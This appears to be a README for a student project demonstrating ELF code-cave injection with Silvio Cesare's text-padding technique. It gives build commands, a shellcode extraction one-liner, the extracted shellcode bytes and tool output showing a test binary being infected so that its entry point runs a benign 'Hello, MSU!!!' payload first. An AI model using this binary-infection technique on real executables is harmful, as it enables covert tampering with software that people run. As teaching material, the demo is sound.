ELF FRAMEWORK
===============================
In the framework of the project, the format of the file elf was studied.
The subtleties of working with this file in the context of arm architecture for android and macOS.

* Go deep into development of C++ library class for building embedded code for elf files with the possibility of further developing the program for macOS arm in the hope to increase the availability of materials about that system for such non-trivial tasks. 
* In-depth look into the search for vulnerabilities in elf files and especially the so-called code cave as a prime example of such vulnerabilities.
* As a result, we developed a tutorial that embeds executable code into an elf file using Silvio's algorithm. Its creation formed the basis of the software part of the project and is the most difficult part of it.

Demo
-------

**0. Prepare the environment. To run the image use the `docker.sh` script.ds**
```shell
docker build -t codecave . ;
./docker.sh 
```
_Output_ 
```s
root@26628e5b0128:/codecave# [random hash after @]
```

**1. Build the malicious code in assembler, which we're going to inject**
```shell
nasm -f elf -o helloMSU.o helloMSU.asm;ld -m elf_i386 -o helloMSU helloMSU.o
```

**2. Check that the malicious code outputs `Hello, MSU!!!` to the console**
```shell
./helloMSU
```
_Output:_ 
```
Hello, MSU!!!
Segmentation fault
```

**3. Extract the byte code and copy it to codeCavePayload.h**
```shell
for i in `objdump -d ./helloMSU | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' `; do echo -n "\\x$i" ; done | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
```
_Output:_
```
"\xeb\x19\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xeb\x19\xba\x00\x00\x00\x00\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x4d\x53\x55\x21\x21\x21\x0d\x0a"
```
**4. Build the `Code Cave` (with updated codeCavePayload.h)**
```shell
make
```
_Output:_
```
...
gcc -no-pie -DBUILD32 -c codeCave.c -o codeCave32.o
gcc -no-pie -DBUILD64 -c codeCave.c -o codeCave64.o
gcc -no-pie -c common.c -o common.o
gcc -no-pie main.o codeCave32.o codeCave64.o common.o -o codeCave
```
**5. Build the source program**
```shell
gcc -no-pie -Wl,-z,noseparate-code helloHSE.c -o helloHSE
```

**6. Check that the source program outputs `Hello HSE!` to the console**
```shell
./helloHSE
```
_Output:_
```
Hello HSE!
```

**7. I solemnly swear I am up to no bad! Start infect!**
```shell
./codeCave ./helloHSE
```
_Output:_
```
[+] Reading headers
[+] x86-64bit ELF
[+] codeCavePayload size: 52 bytes
[+] text segment found
[+] Padding size: 1844
[+] Original entry point: 0x4004e0
[+] New entry point: 0x4006dc
[+] Change text segment's p_filesz and p_memsz
[+] Change sh_size of the last section of the text segment
[+] Initialize codeCavePayload
[+] Construct the infected file
[+] Write the codeCavePayload
[+] Replace the original file
[+] Done!
```

**8. Check the source program again**
```shell
./helloHSE
```
_Output:_
```
Hello, MSU!!!
Hello HSE!
```

**Mischief Managed!**

Based on [Silvio Algorithm](https://en.wikipedia.org/wiki/Silvio_Cesare) classic .text section padding technique.